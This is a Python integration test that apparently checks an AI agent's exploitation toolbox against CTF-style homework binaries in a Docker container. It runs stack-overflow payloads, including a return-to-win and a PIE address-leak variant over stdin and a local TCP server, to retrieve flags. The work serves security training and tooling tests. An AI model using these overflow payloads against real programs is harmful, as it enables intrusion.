#!/usr/bin/env python3
"""Live integration check: skills against a real enigma-homework container.

Requires docker + the enigma-homework:latest image (homework/build.sh).
Plain asserts; run directly: pipenv run python homework/test_skills_live.py
"""
import asyncio
import dataclasses
import json
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
sys.path.insert(0, REPO)
sys.path.insert(0, HERE)

from run_hw import _load_enigma_env  # noqa: E402

NAME = "enigma-hw-skilltest"


def sh(*args, **kw):
    return subprocess.run(list(args), capture_output=True, **kw)


async def main():
    _load_enigma_env()
    import httpx
    from enigma.config import load_config
    from enigma.tools import ToolBox

    expected = json.load(open(os.path.join(HERE, "flags.json")))["rung1"]

    sh("docker", "rm", "-f", NAME)
    r = sh("docker", "run", "-d", "--name", NAME,
           "enigma-homework:latest", "sleep", "infinity")
    assert r.returncode == 0, r.stderr.decode()
    cid = r.stdout.decode().strip()
    try:
        r = sh("docker", "cp", os.path.join(HERE, "flags", "rung1.txt"),
               "%s:/flag.txt" % NAME)
        assert r.returncode == 0, r.stderr.decode()

        cfg = load_config()
        async with httpx.AsyncClient() as http:
            tb = ToolBox(cfg, http)
            tb.bind_container(cid, workdir="/workspace")

            out = await tb.run("skill", "discover_offset /target/rung1")
            assert "offset to saved return address: 72" in out, out

            out = await tb.run("skill", "find_symbol /target/rung1 win")
            assert "0x" in out and "absolute" in out, out
            win = out.split("win = ")[1].split(" ")[0]

            out = await tb.run("skill", "deliver_stdin /target/rung1 A*72 + p64(%s)" % win)
            assert expected in out, out

            # ---- rung2: PIE leak-and-deliver in ONE process via pwn_stdin ----
            sh("docker", "cp", os.path.join(HERE, "flags", "rung2.txt"),
               "%s:/flag.txt" % NAME)
            expected2 = json.load(open(os.path.join(HERE, "flags.json")))["rung2"]

            out = await tb.run("skill", "find_symbol /target/rung2 main")
            assert "0x" in out and "PIE" in out, out
            main_off = int(out.split("file offset ")[1].split(" ")[0], 16)
            out = await tb.run("skill", "find_symbol /target/rung2 win")
            win_off = int(out.split("file offset ")[1].split(" ")[0], 16)
            delta = main_off - win_off  # win = leak - delta

            out = await tb.run(
                "skill",
                r"pwn_stdin /target/rung2 main:\s*(0x[0-9a-f]+) "
                "A*72 + p64({leak}-0x%x)" % delta)
            assert expected2 in out, out

            # ---- tcp transport: leak server behind the in-container relay ----
            server_src = (
                "import socket\n"
                "s = socket.socket()\n"
                "s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
                "s.bind(('127.0.0.1', 31337))\n"
                "s.listen(1)\n"
                "c, _ = s.accept()\n"
                "c.sendall(b'main: 0x1000\\n')\n"
                "hdr = c.recv(8)\n"
                "n = int(hdr.decode(), 16)\n"
                "data = b''\n"
                "while len(data) < n:\n"
                "    chunk = c.recv(n - len(data))\n"
                "    if not chunk:\n"
                "        break\n"
                "    data += chunk\n"
                "import struct\n"
                "want = b'A' * 72 + struct.pack('<Q', 0x1000 - 0xb9)\n"
                "c.sendall(b'flag{tcp_live}\\n' if data == want else b'nope\\n')\n"
                "c.close()\n"
            )
            code, out_ = await tb._cexec("bash", "-c",
                                         "cat > /tmp/leak_server.py",
                                         input_bytes=server_src.encode())
            assert code == 0, out_
            code, out_ = await tb._cexec(
                "bash", "-c",
                "nohup python3 /tmp/leak_server.py >/tmp/srv.log 2>&1 & sleep 1; "
                "echo started")
            assert "started" in out_, out_

            out = await tb.run(
                "skill",
                r"pwn_tcp 127.0.0.1 31337 main:\s*(0x[0-9a-f]+) "
                "A*72 + p64({leak}-0xb9) hex8")
            assert "flag{tcp_live}" in out, out

            # docs advertise the skills
            docs = tb.docs()
            assert "discover_offset" in docs and "deliver_stdin" in docs, docs
    finally:
        sh("docker", "rm", "-f", NAME)
    print("test_skills_live OK")


if __name__ == "__main__":
    asyncio.run(main())
